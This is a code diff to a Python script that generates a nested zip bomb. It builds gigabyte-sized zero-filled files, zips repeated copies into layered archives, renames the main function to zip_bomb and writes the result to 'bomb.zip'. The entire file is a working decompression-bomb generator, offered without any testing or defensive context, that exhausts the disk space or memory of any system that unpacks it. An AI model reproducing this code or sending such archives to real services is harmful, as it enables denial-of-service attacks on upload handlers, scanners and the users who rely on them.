@@ -2,6 +2,7 @@ from typing import Dict, List
 import zipfile
 import io
 from copy import deepcopy
+import uuid
 
 def generate_zip(files: List[Dict]) -> bytes:
     buff = io.BytesIO()
@@ -12,16 +13,16 @@ def generate_zip(files: List[Dict]) -> bytes:
     return buff.getvalue()  
 
 def dummy_zip(size) -> bytes:
-    return generate_zip( # 1gb in memory zipped file
+    return generate_zip( # 1GB in memory zipped file
         [{
-            'name': 'dummy',
+            'name': f'dummy-{uuid.uuid4().hex}',
             'content': dummy_file(size)
         }]
     )
 
 def make_copies(zip_file, n) -> List[Dict]:
     return [
-            {'name': f'dummy-{i}', 'content': io.BytesIO(deepcopy(zip_file))}
+            {'name': f'dummy-{i}.zip', 'content': io.BytesIO(deepcopy(zip_file))}
             for i in range(n)
         ]  # Nearly 10 GB compressed?
     
@@ -30,7 +31,7 @@ def ten_gb_zip() -> bytes:
     files = make_copies(dummy_zip_file, 10)
     return generate_zip(files)
 
-def deep_zip(depth) -> bytes:
+def zip_bomb(depth) -> bytes:
     decompressed_size = 1 # GB
     zips = []
     for i in range(1, depth + 1):
@@ -39,23 +40,21 @@ def deep_zip(depth) -> bytes:
 
     # Compress all zips to single zip
     zip_bomb = generate_zip([{
-        'name': f'zip-{count}', 
+        'name': f'zip-{count}.zip', 
         'content': io.BytesIO(z)
         }
         for count, z in enumerate(zips)
     ])
-    return {'content': zip_bomb, 'size': len(zip_bomb), 'surprise': decompressed_size}
+    return {'content': zip_bomb, 'size': len(zip_bomb), 'decompressed': decompressed_size}
 
 
-def dummy_file(size) -> io.BytesIO: # size in GB
-    f = io.BytesIO()
-    content = (size*1024*1024)*'0'.encode()
-    for i in range(1024):
-        f.write(content)
+def dummy_file(size) -> bytes: # size in GB
+    content = (size*1024*1024) * b'0' * 1024
+    f = io.BytesIO(content)
     return f
 
 if __name__ == "__main__":
-    z = deep_zip(10)
+    z = zip_bomb(5)
     content, size, decompress_size = z.values()
     with open('bomb.zip', 'wb') as f:
         f.write(content)
